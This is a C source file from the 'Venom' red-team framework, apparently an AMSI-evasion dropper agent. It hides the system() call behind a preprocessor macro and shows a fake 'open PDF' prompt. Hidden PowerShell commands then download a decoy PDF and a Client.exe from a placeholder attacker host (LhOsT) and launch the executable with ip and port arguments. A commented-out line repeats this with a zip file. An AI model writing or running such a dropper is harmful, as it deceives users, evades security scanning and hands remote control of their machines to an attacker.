/*
Author: r00t-3xp10it (SSA RedTeam @2020)
Framework: Venom v1.0.17.4 - Amsi Evasion - Agent nº5
Description: C PreProcessor (macro) system API's obfuscation.
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>
#define _____(d,y,i,o,q,h)(i##d##h##y##o##q)
#define _ _____(y,t,s,e,m,s)

int main()
{
    MessageBox(NULL, "Open Archive with PDF Reader?", "Portable Document Format (PDF)", MB_OK);
   _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.pdf', 'TempDir\\FiLNaMe.pdf') && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\FiLNaMe.pdf'");Sleep(1);
   _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/Client.exe', 'TempDir\\Client.exe') && powershell Start-Process -windowstyle minimized -FilePath 'TempDir\\Client.exe' -ArgumentList 'ip=LhOsT','port=LpOrT'");
/* _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/Client.zip', 'TempDir\\Client.zip') && cd TempDir && unzip Client.zip && cmd /R start /min Client.exe ip=LhOsT port=LpOrT"); */
   return 0;
}
